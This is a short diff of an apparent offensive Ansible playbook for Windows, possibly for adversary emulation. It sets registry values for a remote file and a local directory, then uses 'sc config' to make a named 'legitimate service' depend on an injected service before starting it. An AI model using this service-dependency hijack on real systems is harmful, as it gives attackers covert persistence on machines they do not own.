@@ -24,7 +24,7 @@
         state: present
       loop:
         - { name: "RemoteUrl", value: "/{{ group_names[0] }}{{ hostvars[inventory_hostname].file_to_download }}" }
-        - { name: "LocalDir", value: "{{ path_to_download }}" }
+        - { name: "LocalDir", value: "{{ path_for_comm }}" }
 
     # Change permissions on registry
     - name: "Change permissions on registry"
@@ -36,7 +36,7 @@
     # Change dependency of legitimate service
     - name: "Change dependency of legitimate service"
       win_command: |
-        cmd /c "sc config {{ service_for_injection }} depend = {{ service_name }}"
+        cmd /c "sc config {{ service_for_injection }} depend= {{ service_name }}"
 
     # Start the service
     - name: "Start the service"
